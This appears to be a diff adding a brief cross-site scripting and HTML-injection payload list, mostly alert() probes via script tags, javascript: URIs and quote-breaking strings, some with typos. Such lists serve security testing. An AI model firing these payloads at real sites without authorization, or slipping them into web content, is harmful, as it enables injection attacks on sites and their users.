@@ -1,0 +1,23 @@
+<h1><marquee>hello</marque></h1>
+
+<h1>Hello,<script>alert(1)</script>!</h1> (for both see xss and htmlI)
+
+<TAG RESOURCE=javascript:alert(1)>
+
+<iframe src=javascript:alert(1)>
+
+<object data=javascript:alert(1)>
+
+<script>alert(document.domain)</script>   ((xss + HTMLI) 
+
+*/</script>'>alert(1)/*<script/1='
+
+<marquee><script>alert('XSS')</script></marquee>
+
+"><script alert(String.fromCharCode(88,83,83))</script>
+
+'>><marquee><h1>XSS</h1></marquee>
+
+'">><script>alert('XSS')</script>
+
+'">><marquee><h1>XSS</h1></marquee>
